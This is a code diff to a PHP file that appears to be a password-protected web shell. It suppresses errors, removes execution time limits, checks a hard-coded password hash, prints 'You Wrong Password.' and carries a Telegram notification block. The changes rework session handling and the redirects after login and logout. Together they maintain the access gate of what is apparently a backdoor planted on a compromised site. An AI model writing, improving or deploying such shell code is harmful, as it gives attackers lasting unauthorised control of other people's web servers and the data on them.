@@ -6,7 +6,10 @@
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-session_start();
+
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
 
 // NOTIFY TELEGRAM : START
 $hashed_password = '$2y$10$n7OXssNZ0RXYQ.ehxDfjCeema90KbFax4VwOQg6ndtlo2vZxLpska';
@@ -51,9 +54,18 @@ function get_current_full_url_short()
     return $scheme . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 }
 
+function get_redirect_base_url()
+{
+    $uri = $_SERVER['REQUEST_URI'];
+    $uri = preg_replace('/&logout/', '', $uri);
+    $uri = preg_replace('/\?logout/', '', $uri);
+    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
+    return $scheme . $_SERVER['HTTP_HOST'] . $uri;
+}
+
 if (isset($_GET['logout'])) {
     session_destroy();
-    header('Location: ' . $_SERVER['PHP_SELF'] . $_GET['tmp']);
+    header('Location: ' . get_redirect_base_url());
     exit;
 }
 
@@ -61,7 +73,7 @@ if (!isset($_SESSION['logged_in'])) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
         if (password_verify($_POST['password'], $hashed_password)) {
             $_SESSION['logged_in'] = true;
-            header('Location: ' . $_SERVER['PHP_SELF'] . $_GET['tmp']);
+            header('Location: ' . get_redirect_base_url());
             exit;
         } else {
             $login_error = "You Wrong Password.";
